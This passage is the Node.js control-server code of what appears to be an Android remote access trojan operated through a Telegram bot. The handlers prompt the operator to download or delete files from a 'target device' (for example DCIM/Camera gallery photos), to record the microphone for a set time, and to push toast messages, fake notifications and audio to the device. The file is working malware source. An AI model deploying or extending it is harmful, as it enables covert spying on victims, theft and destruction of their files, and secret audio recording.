            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '📩𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙🗳️\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '📂𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚💥\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Masukkan berapa lama Anda ingin mikrofon merekam.\n\n' +
            'Perlu diingat bahwa Anda harus memasukkan waktu secara numerik dalam satuan detik.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Masukkan pesan yang ingin Anda tampilkan di perangkat target.\n\n' +
            'Toast adalah pesan singkat yang muncul di layar perangkat selama beberapa detik.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Masukkan pesan yang ingin Anda tampilkan sebagai notifikasi\n\n' +
            'Pesan Anda akan muncul di bilah status perangkat target seperti notifikasi biasa.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Masukkan Link Audio Yang Mau Diputar\n\n' +
            'Perlu diingat bahwa Anda harus memasukkan tautan langsung dari suara yang diinginkan, jika tidak, suara tidak akan diputar.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
